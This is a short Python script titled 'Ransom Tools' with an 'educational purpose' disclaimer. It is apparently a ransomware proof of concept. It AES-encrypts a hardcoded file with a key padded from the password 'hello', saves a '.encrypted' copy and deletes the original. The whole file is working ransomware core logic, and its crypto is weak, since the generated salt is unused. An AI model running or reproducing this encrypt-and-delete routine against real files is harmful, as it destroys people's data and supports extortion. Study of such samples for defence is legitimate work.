"""Ransom Tools
Simple Encryption
Author: Yakuza-D
Disclaimer: this app written only and only for educational purpose
"""
# Step 1: Import Requires Modules for Encryption
from os import remove, path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

"""Step 2: Deriving the Encryption key from a Simple Password"""
# Simple Password text
password = "hello"

# Generate random salt
salt = get_random_bytes(16)

# Create a Simple key from the password, then padded(truncated) to 32 bytes
key = password.encode().ljust(32, b'\0')[:32]

"""Step 3: Create Function to Encrypt a File"""
def encrypt_file(file_path, input_key):
    try:
        # Generate a Random Initialization Vector(IV)
        iv = get_random_bytes(16)

        # Create a Cipher object using the AES algorithm and the key
        cipher = AES.new(input_key, AES.MODE_CBC, iv)

        # Read the file contents

        with open(file_path, 'rb') as file: # noqa
            fileData = file.read()

        # Encrypt Data with Padding
        encryptedData = cipher.encrypt(pad(fileData, AES.block_size))

        # Write the Salt, IV & Encrypted Data to a new file
        with open(f"{file_path}.encrypted", "wb") as file: # noqa
            file.write(salt + iv + encryptedData)

        # Remove the original file
        remove(file_path)
        print(f"[+] Encryption: Encryption successfully done => {file_path}.encrypted")

    except Exception as e:
        print(f"[-] Encryption: Encryption Failed! => {file_path}\n[-] Error: {e}")

# Step 4: Create Main Script
if __name__ == "__main__":
    # Hardcoded filepath
    filePath = r"H:/Repo/RansomPOC/test.docx"

    # Debug Print => for filepath to ensure is correct
    print(f"[*] Debug Info: Submitted filepath is => {filePath}")

    if path.exists(filePath):
        print(f"[*] Debug Info: Encryption Started for => {filePath}")
        encrypt_file(filePath, key)
    else:
        # Debug Print
        print(f"[*] Debug Info: File not found => {filePath}")
        print(f"[*] Debug Info: The absolute filepath is => {path.abspath(filePath)}")

        # Debug Print
        directory, file = path.split(filePath)
        print(f"[*] Debug Info: Directory Exists Checking => {path.isdir(directory)}")
        print(f"[*] Debug Info: File Exists Checking => {path.isfile(file)}")






